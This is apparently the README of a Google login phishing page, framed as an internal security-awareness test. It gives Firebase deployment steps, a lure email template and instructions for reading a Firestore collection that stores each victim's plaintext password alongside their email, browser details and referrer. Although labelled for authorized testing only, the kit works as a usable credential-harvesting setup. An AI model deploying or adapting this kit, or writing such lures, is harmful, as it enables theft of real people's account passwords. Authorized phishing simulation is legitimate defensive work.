# Google Login Phishing Test Page

Security awareness training tool for internal company testing.

## Setup Instructions

### 1. Create Firebase Project

1. Go to [Firebase Console](https://console.firebase.google.com/)
2. Create a new project
3. Enable **Firestore Database** (Start in production mode)
4. Enable **Hosting**

### 2. Get Firebase Config

1. In Firebase Console → Project Settings → General
2. Under "Your apps", click the web icon (`</>`) to add a web app
3. Copy the `firebaseConfig` object

### 3. Update the Code

Edit `public/index.html` and replace the placeholder config:

```javascript
const firebaseConfig = {
    apiKey: "YOUR_API_KEY",
    authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
    projectId: "YOUR_PROJECT_ID",
    storageBucket: "YOUR_PROJECT_ID.appspot.com",
    messagingSenderId: "YOUR_SENDER_ID",
    appId: "YOUR_APP_ID"
};
```

### 4. Deploy

```bash
# Install Firebase CLI (if not installed)
npm install -g firebase-tools

# Login to Firebase
firebase login

# Initialize project (select existing project)
firebase init

# Deploy
firebase deploy
```

## Usage

Send the URL with the email parameter:

```
https://YOUR-PROJECT-ID.web.app/?email=employee@company.com
```

Example email template:
> Your account requires verification. Please sign in: [link]

## View Collected Data

1. Go to Firebase Console → Firestore Database
2. View the `phishing_test_credentials` collection

Each entry contains:
- `email` - The pre-filled email from URL
- `password` - The entered password
- `timestamp` - When it was submitted
- `userAgent` - Browser info
- `referrer` - Where they came from

## Security Notes

- Firestore rules only allow **create** (no read/update/delete from client)
- Only accessible via Firebase Console
- Use only for authorized internal security testing
